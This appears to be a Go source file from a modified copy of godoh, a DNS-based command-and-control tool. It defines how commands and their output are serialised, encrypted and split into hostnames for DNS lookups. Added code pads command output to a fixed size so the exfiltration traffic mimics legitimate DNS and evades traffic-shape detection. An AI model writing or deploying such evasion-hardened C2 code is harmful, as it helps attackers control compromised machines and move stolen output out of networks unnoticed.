package protocol

import (
	"bytes"
	"crypto/rand" // ADDED: Import the crypto/rand package for secure random bytes

	"github.com/sensepost/godoh/lib"
)

// Command represents a command to be send over DNS.
type Command struct {
	Exec       string `json:"exec"`
	Data       []byte `json:"data"`
	ExecTime   int64  `json:"exectime"`
	Identifier string `json:"identifier"`
}

// Prepare configures the File struct with relevant data.
func (c *Command) Prepare(cmd string) {

	c.Exec = cmd
	c.Identifier = lib.RandomString(5)
}

// GetOutgoing returns the hostnames to lookup as part of a file
// transfer operation.
func (c *Command) GetOutgoing() string {

	return c.Exec
}

// GetRequests returns the hostnames to lookup as part of a command
// output operation.
func (c *Command) GetRequests() ([]string, string) {

	// --- START: NEW, CORRECTED PADDING LOGIC ---
	// Content Shape Mimicry: We pad the PLAINTEXT (the command output)
	// before it gets encrypted. This ensures the final ciphertext is always valid.

	// This target size should be based on your analysis of legitimate traffic.
	// We'll use 150 bytes as an example to ensure even short commands like "pwd"
	// produce a larger, more uniform plaintext payload.
	targetSize := 150

	if len(c.Data) > 0 && len(c.Data) < targetSize {
		paddingSize := targetSize - len(c.Data)
		padding := make([]byte, paddingSize)
		// Fill padding with cryptographically secure random bytes
		rand.Read(padding)
		// Prepend the padding to the real data. Since it's just random bytes,
		// it doesn't matter where it goes.
		c.Data = append(padding, c.Data...)
	}
	// --- END: NEW, CORRECTED PADDING LOGIC ---

	var b bytes.Buffer
	// lib.GobPress will now take our potentially padded c.Data, serialize it,
	// and then encrypt it. The encryption function will handle the final
	// crypto-required PKCS#7 padding correctly.
	lib.GobPress(c, &b)

	// Requestify takes the final, valid ciphertext and splits it into hostnames.
	requests := Requestify(b.Bytes(), CmdProtocol)

	return requests, SuccessDNSResponse
}